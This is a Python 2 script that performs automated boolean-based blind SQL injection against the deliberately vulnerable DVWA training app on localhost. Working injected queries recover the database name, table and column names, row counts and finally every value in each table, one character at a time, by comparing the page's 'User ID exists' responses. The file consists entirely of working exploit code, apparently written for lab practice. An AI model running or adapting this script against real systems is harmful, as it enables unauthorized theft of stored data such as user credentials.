# coding:utf-8
import sys
import requests
import re
import string
from bs4 import BeautifulSoup as BS


reload(sys)
sys.setdefaultencoding('utf-8')

dic = string.digits + string.letters + "!@#$%^&*()_{}-="+'\n'
#############
# length of database
i = 0
num = 0
while 1:
    url = r'http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/'
    cookie = {'security': 'low', 'PHPSESSID': 'i4rg4n1mk2osjatngviicih0r1'}
    data = {'id': r"1' and length(database())>" +
            str(i)+'#', 'Submit': 'Submit#'}
    t = requests.get(url, cookies=cookie, params=data)
    content = t.text
    soup = BS(content, 'lxml')
    pre = soup.select('pre')
    c1 = re.compile('User ID is MISSING from the database.')
    c2 = re.compile('User ID exists in the database.')
    result1 = c1.findall(str(pre[0]))
    result2 = c2.findall(str(pre[0]))
    if 'User ID is MISSING from the database.' in result1:
        num = i
        print num
        break
    if 'User ID exists in the database.' in result2:
        i = i+1

########
# content of database
databasename = ''
for i in range(num+1):
    for c in dic:
        url = r'http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/'
        cookie = {'security': 'low', 'PHPSESSID': 'i4rg4n1mk2osjatngviicih0r1'}
        data = {'id': "1' and ascii(substr(database(),"+str(i)+",1))=" +
                str(ord(c))+'#', 'Submit': 'Submit#'}
        t = requests.get(url, cookies=cookie, params=data)
        content = t.text
        soup = BS(content, 'lxml')
        pre = soup.select('pre')
        c1 = re.compile('User ID is MISSING from the database.')
        c2 = re.compile('User ID exists in the database.')
        result1 = c1.findall(str(pre[0]))
        result2 = c2.findall(str(pre[0]))
        if 'User ID is MISSING from the database.' in result1:
            pass
        if 'User ID exists in the database.' in result2:
            databasename = databasename+c
print databasename


#######
# length of table_name
j = 0
table_count = 0
while 1:
    url = r'http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/'
    cookie = {'security': 'low', 'PHPSESSID': 'i4rg4n1mk2osjatngviicih0r1'}
    data = {'id': r"1' and (select length(table_name) from information_schema.tables where table_schema=database() limit " +
            str(j)+",1)> 1 #", 'Submit': 'Submit#'}
    t = requests.get(url, cookies=cookie, params=data)
    content = t.text
    soup = BS(content, 'lxml')
    pre = soup.select('pre')
    c1 = re.compile('User ID is MISSING from the database.')
    c2 = re.compile('User ID exists in the database.')
    result1 = c1.findall(str(pre[0]))
    result2 = c2.findall(str(pre[0]))
    if 'User ID is MISSING from the database.' in result1:
        table_count = j
        print table_count
        break
    if 'User ID exists in the database.' in result2:
        j = j + 1


#######
# length of table_name
alloftableslength = []
for k in range(table_count):
    x = 0
    table_length = 0
    while 1:
        url = r'http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/'
        cookie = {'security': 'low', 'PHPSESSID': 'i4rg4n1mk2osjatngviicih0r1'}
        data = {'id': r"1' and (select length(table_name) from information_schema.tables where table_schema=database() limit "+str(k)+",1)>" +
                str(x)+"#", 'Submit': 'Submit#'}
        t = requests.get(url, cookies=cookie, params=data)
        content = t.text
        soup = BS(content, 'lxml')
        pre = soup.select('pre')
        c1 = re.compile('User ID is MISSING from the database.')
        c2 = re.compile('User ID exists in the database.')
        result1 = c1.findall(str(pre[0]))
        result2 = c2.findall(str(pre[0]))
        if 'User ID is MISSING from the database.' in result1:
            table_length = x
            break
        if 'User ID exists in the database.' in result2:
            x = x + 1
    alloftableslength.append(x)
print alloftableslength

#######
# name of table_name
tablename = []
for m in range(len(alloftableslength)):
    name = ''
    for n in range(alloftableslength[m]+1):
        for cc in dic:
            url = r'http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/'
            cookie = {'security': 'low', 'PHPSESSID': 'i4rg4n1mk2osjatngviicih0r1'}
            data = {'id': "1' and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit "+str(m)+",1),"+str(n)+",1))="+str(ord(cc))+"#", 'Submit': 'Submit#'}
            t = requests.get(url, cookies=cookie, params=data)
            content = t.text
            soup = BS(content, 'lxml')
            pre = soup.select('pre')
            c1 = re.compile('User ID is MISSING from the database.')
            c2 = re.compile('User ID exists in the database.')
            result1 = c1.findall(str(pre[0]))
            result2 = c2.findall(str(pre[0]))
            if 'User ID is MISSING from the database.' in result1:
                pass
            if 'User ID exists in the database.' in result2:
                name = name+cc
    tablename.append(name)
print tablename

########
# each of tables' column count
columns = []
for o in range(len(tablename)):
    k1 = 0
    columncount = 0
    while 1:
        url = r'http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/'
        cookie = {'security': 'low', 'PHPSESSID': 'i4rg4n1mk2osjatngviicih0r1'}
        data = {'id': r"1' and (select length(column_name) from information_schema.columns where table_name="+'\''+tablename[o]+'\''+" limit "+str(k1)+",1)>1#", 'Submit': 'Submit#'}
        t = requests.get(url, cookies=cookie, params=data)
        content = t.text
        soup = BS(content, 'lxml')
        pre = soup.select('pre')
        c1 = re.compile('User ID is MISSING from the database.')
        c2 = re.compile('User ID exists in the database.')
        result1 = c1.findall(str(pre[0]))
        result2 = c2.findall(str(pre[0]))
        if 'User ID is MISSING from the database.' in result1:
            columncount = k1
            columns.append(columncount)
            break
        if 'User ID exists in the database.' in result2:
            k1 = k1 + 1
print columns


########
# each of tables' length of column name
tccf = []
for u in range(len(tablename)):
    tcc = []
    for p in range(columns[u]):
        k2 = 0
        countk2name = 0
        while 1:
            url = r'http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/'
            cookie = {'security': 'low', 'PHPSESSID': 'i4rg4n1mk2osjatngviicih0r1'}
            data = {'id': r"1' and (select length(column_name) from information_schema.columns where table_name="+'\''+tablename[u]+'\''+" limit "+str(p)+",1)>"+str(k2)+"#", 'Submit': 'Submit#'}
            t = requests.get(url, cookies=cookie, params=data)
            content = t.text
            soup = BS(content, 'lxml')
            pre = soup.select('pre')
            c1 = re.compile('User ID is MISSING from the database.')
            c2 = re.compile('User ID exists in the database.')
            result1 = c1.findall(str(pre[0]))
            result2 = c2.findall(str(pre[0]))
            if 'User ID is MISSING from the database.' in result1:
                countk2name = k2
                tcc.append(countk2name)
                break
            if 'User ID exists in the database.' in result2:
                k2 = k2 + 1
    tccf.append(tcc)
print tccf

##############
# each of tables' column name
collection = []
for w in range(len(tablename)):
    colns = []
    for s in range(columns[w]):
        namecl = ''
        for c in range(tccf[w][s]+1):
            for ccc in dic:
                url = r'http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/'
                cookie = {'security': 'low', 'PHPSESSID': 'i4rg4n1mk2osjatngviicih0r1'}
                data = {'id': "1' and ascii(substr((select column_name from information_schema.columns where table_name="+'\''+tablename[w]+'\''+" limit "+str(s)+",1),"+str(c)+",1))="+str(ord(ccc))+"#", 'Submit': 'Submit#'}
                t = requests.get(url, cookies=cookie, params=data)
                content = t.text
                soup = BS(content, 'lxml')
                pre = soup.select('pre')
                c1 = re.compile('User ID is MISSING from the database.')
                c2 = re.compile('User ID exists in the database.')
                result1 = c1.findall(str(pre[0]))
                result2 = c2.findall(str(pre[0]))
                if 'User ID is MISSING from the database.' in result1:
                    pass
                if 'User ID exists in the database.' in result2:
                    namecl = namecl+ccc
        colns.append(namecl)
    collection.append(colns)
print collection







#########
# the sum of the columns
#1' and (select count(*) from users)>1#
k10 = 0
countnums = 0
allcount = []
for mm in tablename:
    while 1:
        url = r'http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/'
        cookie = {'security': 'low', 'PHPSESSID': 'i4rg4n1mk2osjatngviicih0r1'}
        data = {'id': r"1' and (select count(*) from "+str(mm)+")>"+str(k10)+"#", 'Submit': 'Submit#'}
        t = requests.get(url, cookies=cookie, params=data)
        content = t.text
        soup = BS(content, 'lxml')
        pre = soup.select('pre')
        c1 = re.compile('User ID is MISSING from the database.')
        c2 = re.compile('User ID exists in the database.')
        result1 = c1.findall(str(pre[0]))
        result2 = c2.findall(str(pre[0]))
        if 'User ID is MISSING from the database.' in result1:
            countnums = k10
            break
        if 'User ID exists in the database.' in result2:
            k10 = k10 + 1
    allcount.append(k10)
print allcount


#########
# name of column
# substr((select any(column_name) from any(table_name) limit any,1),inany,1)='any'#
finallist=[]
for kt,st in enumerate(tablename):
    for ct,cs in enumerate(collection[kt]):
        colllist = []
        for uu in range(allcount[kt]):
            contents = ''
            for index in range(35):
                for cccc in dic:
                    url = r'http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/'
                    cookie = {'security': 'low', 'PHPSESSID': 'i4rg4n1mk2osjatngviicih0r1'}
                    data = {'id': r"1' and ascii(substr((select "+str(cs)+" from "+str(st)+" limit "+str(uu)+",1),"+str(index)+",1))="+str(ord(cccc))+"#", 'Submit': 'Submit#'}
                    t = requests.get(url, cookies=cookie, params=data)
                    content = t.text
                    soup = BS(content, 'lxml')
                    pre = soup.select('pre')
                    c1 = re.compile('User ID is MISSING from the database.')
                    c2 = re.compile('User ID exists in the database.')
                    result1 = c1.findall(str(pre[0]))
                    result2 = c2.findall(str(pre[0]))
                    if 'User ID is MISSING from the database.' in result1:
                        pass
                    if 'User ID exists in the database.' in result2:    
                        contents = contents + cccc
                        colllist.append(contents)
        print colllist






